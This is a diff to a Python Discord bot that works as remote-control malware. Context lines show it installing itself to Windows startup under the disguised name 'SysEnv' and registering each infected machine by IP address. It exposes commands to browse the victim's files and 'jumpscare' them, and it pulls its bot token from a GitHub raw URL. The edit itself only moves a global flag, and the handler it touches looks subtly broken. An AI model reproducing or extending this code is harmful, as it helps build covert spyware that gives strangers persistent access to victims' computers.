@@ -49,9 +49,6 @@ shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
 CHANNEL_ID = 1355560563622678699
 
-global jumpscaring
-jumpscaring = False
-
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
     if script_path is None:
@@ -268,6 +265,8 @@ async def on_ready():
     global_update_channel_id = 1337769661466415136
     channel12 = client.get_channel(global_online_channel_id)
     channel13 = client.get_channel(global_update_channel_id)
+    global jumpscaring
+    jumpscaring = False
     for guild in client.guilds:
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
@@ -739,6 +738,7 @@ async def browse(interaction: nextcord.Interaction):
         await interaction.response.send_message("Browse files:", view=view)
 
 
+
 @client.slash_command(guild_ids=testServerId, description="Jumpscares the client.")
 async def jumpscare(interaction: nextcord.Interaction):
     category = interaction.channel.category
@@ -796,8 +796,9 @@ async def jumpscare(interaction: nextcord.Interaction):
 @client.event
 async def on_message(message):
 
-    if jumpscaring:
-        jumpscaring = False
+    if not message.author.bot:
+        if jumpscaring:
+            jumpscaring = False
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
